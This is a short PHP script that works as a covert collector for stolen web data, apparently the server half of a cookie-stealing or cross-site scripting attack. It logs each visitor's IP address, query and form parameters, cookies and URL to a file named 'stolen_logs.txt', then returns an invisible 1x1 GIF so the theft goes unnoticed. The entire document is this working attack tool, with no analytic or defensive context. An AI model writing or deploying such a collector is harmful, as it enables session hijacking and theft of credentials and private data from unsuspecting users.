<?php
$logfile = "stolen_logs.txt";

$data = date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | ";
$data .= "GET: " . print_r($_GET, true) . " | ";
$data .= "POST: " . print_r($_POST, true) . " | ";
$data .= "COOKIE: " . print_r($_COOKIE, true) . "\n";
$data .= "Full URL: " . $_SERVER['REQUEST_URI'] . "\n\n";

file_put_contents($logfile, $data, FILE_APPEND);

header("Content-Type: image/gif");
echo base64_decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"); // 1x1 transparent GIF - silent
?>
